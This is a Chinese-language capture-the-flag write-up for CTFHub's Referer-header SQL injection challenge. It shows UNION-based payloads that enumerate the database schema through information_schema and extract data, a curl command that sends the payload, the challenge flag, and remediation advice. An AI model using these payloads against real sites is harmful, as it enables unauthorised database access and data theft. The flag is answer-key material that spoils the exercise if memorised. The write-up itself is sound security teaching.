CTFHub - Web - SQL注入 - Refer注入

# CTFHub # Web # SQL注入 # Refer注入 # UNION注入

一、题目信息

  • 题目名称：Refer注入
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：从 Referer 请求头注入点读取数据库中的 flag。

二、定位注入点

首次访问页面时，服务端提示“请在 referer 输入 ID”。携带标准请求头 Referer: 1 后，页面回显实际执行的 SQL 和查询结果：

Referer: 1

select * from news where id=1
ID: 1
Data: ctfhub

分别发送真、假条件进行验证：

Referer: 1 and 1=1

ID: 1
Data: ctfhub
Referer: 1 and 1=2

无查询结果

条件为真时正常返回，条件为假时无数据，说明 Referer 值未经处理便进入 SQL，且 id 两侧没有引号，属于数字型注入。

Referer 是可伪造的 HTTP 请求头，不能作为可信输入。服务端将其直接拼接 SQL，就会形成 Refer 注入。

三、确定回显列数

使用不存在的负数 -1 避开原记录，并通过 UNION 放置两个测试值：

Referer: -1 union select 111,222

select * from news where id=-1 union select 111,222
ID: 111
Data: 222

两个列位均成功回显，可确认查询共有两列。

四、获取数据库基本信息

Referer: -1 union select database(),user()

ID: sqli
Data: root@localhost
Referer: -1 union select version(),@@version_compile_os

ID: 10.3.22-MariaDB-0+deb10u1
Data: debian-linux-gnu

目标数据库为 sqli，数据库类型为 MariaDB。下一步通过 information_schema 枚举表名和字段名。

五、枚举表和字段

查询当前数据库中的全部表名：

Referer: -1 union select 1,group_concat(table_name)
from information_schema.tables
where table_schema=database()

ID: 1
Data: kjnaisycjg,news

除业务表 news 外，还存在随机表名 kjnaisycjg。继续查询该表的字段：

Referer: -1 union select 1,group_concat(column_name)
from information_schema.columns
where table_schema=database()
and table_name='kjnaisycjg'

ID: 1
Data: nxymcuxxei

目标数据位于 kjnaisycjg.nxymcuxxei。随机名称会随题目环境重新分配，实际解题时以当前查询结果为准。

六、读取 Flag

Referer: -1 union select 1,nxymcuxxei
from kjnaisycjg

ID: 1
Data: ctfhub{367006929755a0d9fd656d02}

使用 curl 复现完整请求：

curl.exe -sS -e "-1 union select 1,nxymcuxxei from kjnaisycjg" "http://<target>/"

七、最终 Flag

ctfhub{367006929755a0d9fd656d02}

八、修复建议

  • 使用预处理语句和参数绑定，禁止将 Referer 等请求头直接拼接进 SQL。
  • 对参与查询的字段执行严格的整数类型校验，只接受合法数字。
  • 生产环境关闭 SQL 语句回显和详细数据库错误信息。
  • 数据库账号遵循最小权限原则，限制对 information_schema 和业务表的访问。
  • 所有 HTTP 输入都应视为不可信数据，包括 URL、Cookie、User-Agent、Referer 和请求体。

九、解题总结

本题与 UA 注入思路一致，只是注入位置变成了 Referer 请求头。确认请求头被直接拼接到 SQL 后，可沿用数字型注入流程：用 -1 避开原记录并验证 UNION 回显列，枚举当前数据库结构，最后读取目标字段。
